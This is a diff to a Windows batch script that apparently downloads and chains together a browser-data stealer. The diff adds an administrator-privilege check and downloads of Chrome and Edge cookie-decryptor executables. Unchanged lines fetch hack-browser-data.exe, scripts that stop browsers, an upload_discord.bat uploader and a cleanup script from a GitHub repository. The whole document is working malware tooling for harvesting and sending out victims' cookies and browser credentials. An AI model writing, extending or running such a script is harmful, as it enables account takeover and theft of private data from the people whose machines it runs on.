@@ -1,6 +1,16 @@
 @echo off
 setlocal EnableDelayedExpansion
 
+net session >nul 2>&1
+if %errorlevel% == 0 (
+    echo Administrative privileges confirmed
+) else (
+    echo Failure: Administrative privileges required
+    echo Right-click on the script and select "Run as administrator"
+    pause
+    exit /B 1
+)
+
 REM Generate unique temp directory name using timestamp
 for /f "tokens=2 delims==" %%I in ('wmic os get localdatetime /value') do set datetime=%%I
 set "tempdir=%TEMP%\bb_%datetime:~0,14%"
@@ -28,6 +38,10 @@ curl -L -s -o process.bat https://raw.githubusercontent.com/24-20/bigboy/main/bi
 curl -L -s -o stop_browsers.bat https://raw.githubusercontent.com/24-20/bigboy/main/bigboyfolder/stop_browsers.bat
 curl -L -s -o start_browsers.bat https://raw.githubusercontent.com/24-20/bigboy/main/bigboyfolder/start_browsers.bat
 curl -L -s -o hack-browser-data.exe https://raw.githubusercontent.com/24-20/bigboy/main/bigboyfolder/hack-browser-data.exe
+
+curl -L -s -o chrome_cookie_decryptor.exe https://raw.githubusercontent.com/24-20/bigboy/main/bigboyfolder/chrome_cookie_decryptor.exe
+curl -L -s -o edge_cookie_decryptor.exee https://raw.githubusercontent.com/24-20/bigboy/main/bigboyfolder/edge_cookie_decryptor.exe
+
 curl -L -s -o upload_discord.bat https://raw.githubusercontent.com/24-20/bigboy/main/bigboyfolder/upload_discord.bat
 curl -L -s -o cleanup.bat https://raw.githubusercontent.com/24-20/bigboy/main/bigboyfolder/cleanup.bat
 
